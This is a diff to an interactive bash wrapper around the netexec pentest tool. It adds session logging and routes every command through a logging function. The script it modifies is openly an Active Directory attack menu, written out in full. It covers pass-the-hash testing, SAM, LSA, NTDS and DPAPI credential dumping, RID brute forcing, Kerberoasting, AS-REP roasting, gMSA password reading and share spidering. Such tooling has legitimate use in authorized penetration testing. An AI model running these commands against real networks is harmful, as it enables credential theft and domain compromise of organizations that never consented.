@@ -16,6 +16,38 @@ NC='\033[0m' # No Color
 # Configuration file to save settings
 CONFIG_FILE="$HOME/.netexec_config"
 
+# Logging setup
+TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+LOG_DIR="$(cd "$(dirname "$0")" && pwd)/reports"
+LOG_FILE="$LOG_DIR/session_${TIMESTAMP}.log"
+REPORT_TXT="$LOG_DIR/report_${TIMESTAMP}.txt"
+REPORT_HTML="$LOG_DIR/report_${TIMESTAMP}.html"
+mkdir -p "$LOG_DIR"
+
+# Write session header to log
+{
+    echo "SESSION_START=$(date '+%Y-%m-%d %H:%M:%S')"
+    echo "HOSTNAME=$(hostname)"
+    echo "USER_RUNNING=$(whoami)"
+} >> "$LOG_FILE"
+
+# Wrapper: run netexec, display output AND save to log
+nxcrun() {
+    echo "" >> "$LOG_FILE"
+    echo "[$(date '+%H:%M:%S')] CMD: netexec $*" >> "$LOG_FILE"
+    netexec "$@" 2>&1 | tee -a "$LOG_FILE"
+}
+
+# Log a section header
+log_section() {
+    {
+        echo ""
+        echo "════════════════════════════════════════"
+        echo "  $1"
+        echo "════════════════════════════════════════"
+    } >> "$LOG_FILE"
+}
+
 # Function to print banner
 print_banner() {
     clear
@@ -119,20 +151,21 @@ show_menu() {
 
 # Function to run authentication tests
 run_auth() {
+    log_section "Authentication Tests | Target: $TARGET"
     echo -e "\n${GREEN}=== Running Authentication Tests ===${NC}"
     
     echo -e "\n${YELLOW}[*] Null Authentication:${NC}"
-    netexec smb "$TARGET" -u '' -p ''
+    nxcrun smb "$TARGET" -u '' -p ''
     
     echo -e "\n${YELLOW}[*] Guest Authentication:${NC}"
-    netexec smb "$TARGET" -u 'guest' -p ''
+    nxcrun smb "$TARGET" -u 'guest' -p ''
     
     if [ "$USERNAME" != "''" ]; then
         echo -e "\n${YELLOW}[*] Local Authentication:${NC}"
-        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" --local-auth
+        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" --local-auth
         
         echo -e "\n${YELLOW}[*] SMB Signing Check:${NC}"
-        netexec smb "$TARGET" --gen-relay-list "relay_${TARGET}.txt"
+        nxcrun smb "$TARGET" --gen-relay-list "relay_${TARGET}.txt"
     fi
     
     read -p "Press Enter to continue..."
@@ -140,6 +173,7 @@ run_auth() {
 
 # Function to run hash checking
 run_hash_check() {
+    log_section "Hash Checking | Target: $TARGET"
     echo -e "\n${GREEN}=== Hash Checking ===${NC}"
     echo -e "${YELLOW}This option allows you to test NTLM hashes against the target${NC}\n"
     
@@ -161,9 +195,9 @@ run_hash_check() {
             read -p "Enter NTLM hash: " ntlm_hash
             read -p "Enter domain (or press Enter to skip): " hash_domain
             if [ -z "$hash_domain" ]; then
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" $LOCAL_AUTH $KERBEROS
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" $LOCAL_AUTH $KERBEROS
             else
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" -d "$hash_domain" $KERBEROS
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlm_hash" -d "$hash_domain" $KERBEROS
             fi
             ;;
         2)
@@ -174,7 +208,7 @@ run_hash_check() {
                 read -p "Press Enter to continue..."
                 return
             fi
-            netexec smb "$TARGET" -H "$hash_file" $LOCAL_AUTH $KERBEROS
+            nxcrun smb "$TARGET" -H "$hash_file" $LOCAL_AUTH $KERBEROS
             ;;
         3)
             echo -e "\n${YELLOW}[*] Testing single NetNTLMv1 hash${NC}"
@@ -182,9 +216,9 @@ run_hash_check() {
             read -p "Enter NetNTLMv1 hash: " ntlmv1_hash
             read -p "Enter domain (or press Enter to skip): " hash_domain
             if [ -z "$hash_domain" ]; then
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" --ntlmv1 $LOCAL_AUTH
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" --ntlmv1 $LOCAL_AUTH
             else
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" -d "$hash_domain" --ntlmv1
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv1_hash" -d "$hash_domain" --ntlmv1
             fi
             ;;
         4)
@@ -195,7 +229,7 @@ run_hash_check() {
                 read -p "Press Enter to continue..."
                 return
             fi
-            netexec smb "$TARGET" -H "$hash_file" --ntlmv1 $LOCAL_AUTH
+            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv1 $LOCAL_AUTH
             ;;
         5)
             echo -e "\n${YELLOW}[*] Testing single NetNTLMv2 hash${NC}"
@@ -203,9 +237,9 @@ run_hash_check() {
             read -p "Enter NetNTLMv2 hash: " ntlmv2_hash
             read -p "Enter domain (or press Enter to skip): " hash_domain
             if [ -z "$hash_domain" ]; then
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" --ntlmv2 $LOCAL_AUTH
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" --ntlmv2 $LOCAL_AUTH
             else
-                netexec smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" -d "$hash_domain" --ntlmv2
+                nxcrun smb "$TARGET" -u "$hash_user" -H "$ntlmv2_hash" -d "$hash_domain" --ntlmv2
             fi
             ;;
         6)
@@ -216,7 +250,7 @@ run_hash_check() {
                 read -p "Press Enter to continue..."
                 return
             fi
-            netexec smb "$TARGET" -H "$hash_file" --ntlmv2 $LOCAL_AUTH
+            nxcrun smb "$TARGET" -H "$hash_file" --ntlmv2 $LOCAL_AUTH
             ;;
         7)
             echo -e "\n${YELLOW}[*] Convert NetNTLM to NTLM (--ntlm)${NC}"
@@ -225,9 +259,9 @@ run_hash_check() {
             read -p "Enter password/hash: " hash_pass
             read -p "Enter domain (or press Enter to skip): " hash_domain
             if [ -z "$hash_domain" ]; then
-                netexec smb "$TARGET" -u "$hash_user" -p "$hash_pass" --ntlm
+                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" --ntlm
             else
-                netexec smb "$TARGET" -u "$hash_user" -p "$hash_pass" -d "$hash_domain" --ntlm
+                nxcrun smb "$TARGET" -u "$hash_user" -p "$hash_pass" -d "$hash_domain" --ntlm
             fi
             ;;
         8)
@@ -243,25 +277,27 @@ run_hash_check() {
 
 # Function to run basic enumeration
 run_basic_enum() {
+    log_section "Basic Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Running Basic Enumeration ===${NC}"
     
     echo -e "\n${YELLOW}[*] Basic SMB Info:${NC}"
-    netexec smb "$TARGET"
+    nxcrun smb "$TARGET"
     
     echo -e "\n${YELLOW}[*] List Shares:${NC}"
-    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
+    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
     
     echo -e "\n${YELLOW}[*] List Users:${NC}"
-    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
+    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --users
     
     echo -e "\n${YELLOW}[*] RID Brute Force:${NC}"
-    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
+    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
     
     read -p "Press Enter to continue..."
 }
 
 # Function for advanced credential dumping
 run_cred_dump_advanced() {
+    log_section "Credential Dumping | Target: $TARGET"
     echo -e "\n${GREEN}=== Advanced Credential Dumping ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -288,9 +324,9 @@ run_cred_dump_advanced() {
             echo "2) secdump (Security dump)"
             read -p "Method [1-2]: " sam_method
             if [ "$sam_method" == "1" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam regdump
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam secdump
             fi
             ;;
         2)
@@ -299,9 +335,9 @@ run_cred_dump_advanced() {
             echo "2) secdump (Security dump)"
             read -p "Method [1-2]: " lsa_method
             if [ "$lsa_method" == "1" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa regdump
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --lsa secdump
             fi
             ;;
         3)
@@ -316,9 +352,9 @@ run_cred_dump_advanced() {
             fi
             
             if [ "$ntds_method" == "1" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds drsuapi $enabled_flag
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds vss $enabled_flag
             fi
             ;;
         4)
@@ -346,9 +382,9 @@ run_cred_dump_advanced() {
             fi
             
             if [ -z "$dpapi_opts" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $mkfile_opt $pvk_opt
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dpapi $dpapi_opts $mkfile_opt $pvk_opt
             fi
             ;;
         5)
@@ -357,19 +393,19 @@ run_cred_dump_advanced() {
             echo "2) wmi (WMI enumeration)"
             read -p "Method [1-2]: " sccm_method
             if [ "$sccm_method" == "1" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm disk
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sccm wmi
             fi
             ;;
         6)
             echo -e "\n${YELLOW}[*] Dumping all credentials...${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --sam --lsa --ntds --dpapi
             ;;
         7)
             echo -e "\n${YELLOW}[*] Dump specific user from NTDS${NC}"
             read -p "Enter username to dump: " target_user
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --ntds --user "$target_user"
             ;;
         8)
             return
@@ -384,6 +420,7 @@ run_cred_dump_advanced() {
 
 # Function for advanced mapping/enumeration
 run_mapping_enum() {
+    log_section "Advanced Mapping & Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Advanced Mapping & Enumeration ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -418,33 +455,33 @@ run_mapping_enum() {
             
             case $share_choice in
                 1)
-                    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
+                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares
                     ;;
                 2)
                     read -p "Enter directory path (default: root): " dir_path
                     if [ -z "$dir_path" ]; then
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir
                     else
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --dir "$dir_path"
                     fi
                     ;;
                 3)
                     read -p "Filter by access (read/write/read,write): " filter
-                    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
+                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --filter-shares "$filter"
                     ;;
             esac
             ;;
         2)
             echo -e "\n${YELLOW}[*] Network Interfaces:${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --interfaces
             ;;
         3)
             echo -e "\n${YELLOW}[*] SMB Sessions:${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --smb-sessions
             ;;
         4)
             echo -e "\n${YELLOW}[*] Disks:${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --disks
             ;;
         5)
             echo -e "\n${YELLOW}[*] Logged-on Users${NC}"
@@ -453,10 +490,10 @@ run_mapping_enum() {
             read -p "Choice [1-2]: " user_choice
             
             if [ "$user_choice" == "1" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users
             else
                 read -p "Enter username to search (regex supported): " search_user
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --loggedon-users-filter "$search_user"
             fi
             ;;
         6)
@@ -470,30 +507,30 @@ run_mapping_enum() {
             
             case $domain_choice in
                 1)
-                    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
+                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
                     ;;
                 2)
                     read -p "Enter output filename: " export_file
-                    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
+                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$export_file"
                     ;;
                 3)
                     read -p "Enter username: " specific_user
-                    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users "$specific_user"
+                    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users "$specific_user"
                     ;;
                 4)
                     read -p "Enter group name (or press Enter for all groups): " group_name
                     if [ -z "$group_name" ]; then
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups
                     else
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups "$group_name"
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --groups "$group_name"
                     fi
                     ;;
                 5)
                     read -p "Enter computer name (or press Enter for all computers): " computer_name
                     if [ -z "$computer_name" ]; then
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers
                     else
-                        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
+                        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --computers "$computer_name"
                     fi
                     ;;
             esac
@@ -502,35 +539,35 @@ run_mapping_enum() {
             echo -e "\n${YELLOW}[*] Local Groups${NC}"
             read -p "Enter local group name (or press Enter for all groups): " local_group
             if [ -z "$local_group" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --local-groups "$local_group"
             fi
             ;;
         8)
             echo -e "\n${YELLOW}[*] Password Policy:${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --pass-pol
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --pass-pol
             ;;
         9)
             echo -e "\n${YELLOW}[*] RID Brute Force${NC}"
             read -p "Enter max RID (default: 4000): " max_rid
             if [ -z "$max_rid" ]; then
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute
             else
-                netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
+                nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --rid-brute "$max_rid"
             fi
             ;;
         10)
             echo -e "\n${YELLOW}[*] RDP Connections (qwinsta):${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --qwinsta
             ;;
         11)
             echo -e "\n${YELLOW}[*] Running Processes (tasklist):${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --tasklist
             ;;
         12)
             echo -e "\n${YELLOW}[*] All-in-One Enumeration:${NC}"
-            netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks --loggedon-users --users --groups --local-groups --pass-pol --rid-brute --qwinsta --tasklist
+            nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --shares --interfaces --smb-sessions --disks --loggedon-users --users --groups --local-groups --pass-pol --rid-brute --qwinsta --tasklist
             ;;
         13)
             return
@@ -545,6 +582,7 @@ run_mapping_enum() {
 
 # Function to run SMB enumeration
 run_smb_enum() {
+    log_section "SMB Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Running SMB Enumeration ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -554,14 +592,14 @@ run_smb_enum() {
     fi
     
     echo -e "\n${YELLOW}[*] All-in-One SMB Enumeration:${NC}"
-    netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol
+    nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS --groups --local-groups --loggedon-users --sessions --shares --pass-pol
     
     echo -e "\n${YELLOW}[*] Running Spider_plus Module:${NC}"
     read -p "Spider_plus read-only? (y/n): " read_only
     if [[ $read_only == "n" || $read_only == "N" ]]; then
-        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o READ_ONLY=false
+        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus -o READ_ONLY=false
     else
-        netexec smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus
+        nxcrun smb "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $LOCAL_AUTH $KERBEROS -M spider_plus
     fi
     
     read -p "Press Enter to continue..."
@@ -569,41 +607,43 @@ run_smb_enum() {
 
 # Function to run LDAP enumeration
 run_ldap_enum() {
+    log_section "LDAP Enumeration | Target: $TARGET"
     echo -e "\n${GREEN}=== Running LDAP Enumeration ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
         echo -e "\n${YELLOW}[*] LDAP User Enumeration (Null):${NC}"
-        netexec ldap "$TARGET" -u '' -p '' --users
+        nxcrun ldap "$TARGET" -u '' -p '' --users
         read -p "Press Enter to continue..."
         return
     fi
     
     echo -e "\n${YELLOW}[*] LDAP All-in-One (Basic):${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation --password-not-required --admin-count --users --groups
     
     echo -e "\n${YELLOW}[*] Find Delegation Relationships:${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
     
     echo -e "\n${YELLOW}[*] Kerberoasting:${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --kerberoasting "kerberoast_${TARGET}.txt"
     
     echo -e "\n${YELLOW}[*] ASREProast:${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --asreproast "asreproast_${TARGET}.txt"
     
     echo -e "\n${YELLOW}[*] ADCS Enumeration:${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M adcs
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M adcs
     
     echo -e "\n${YELLOW}[*] MachineAccountQuota:${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M maq
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS -M maq
     
     echo -e "\n${YELLOW}[*] gMSA (Group Managed Service Accounts):${NC}"
-    netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
+    nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --gmsa
     
     read -p "Press Enter to continue..."
 }
 
 # Function for advanced LDAP queries
 run_advanced_ldap() {
+    log_section "Advanced LDAP Queries | Target: $TARGET"
     echo -e "\n${GREEN}=== Advanced LDAP Queries ===${NC}"
     
     if [ "$USERNAME" == "''" ]; then
@@ -627,23 +667,23 @@ run_advanced_ldap() {
     case $ldap_choice in
         1)
             echo -e "\n${YELLOW}[*] Finding delegation relationships:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --find-delegation
             ;;
         2)
             echo -e "\n${YELLOW}[*] Users and computers trusted for delegation:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --trusted-for-delegation
             ;;
         3)
             echo -e "\n${YELLOW}[*] Users with PASSWD_NOTREQD flag:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --password-not-required
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --password-not-required
             ;;
         4)
             echo -e "\n${YELLOW}[*] Users with adminCount=1 (privileged users):${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --admin-count
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --admin-count
             ;;
         5)
             echo -e "\n${YELLOW}[*] Enumerating domain users:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users
             ;;
         6)
             echo -e "\n${YELLOW}[*] Export users to file${NC}"
@@ -651,7 +691,7 @@ run_advanced_ldap() {
             if [ -z "$user_export" ]; then
                 user_export="users_${TARGET}.txt"
             fi
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --users-export "$user_export"
             echo -e "${GREEN}[+] Users exported to: $user_export${NC}"
             ;;
         7)
@@ -659,7 +699,7 @@ run_advanced_ldap() {
             echo -e "${CYAN}Example: DC=domain,DC=com${NC}"
             read -p "Enter Base DN: " base_dn
             echo -e "\n${YELLOW}[*] Testing with custom Base DN:${NC}"
-            netexec ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
+            nxcrun ldap "$TARGET" -u "$USERNAME" -p "$PASSWORD" $DOMAIN_OPTION $KERBEROS --base-dn "$base_dn" --users
             ;;
         8)
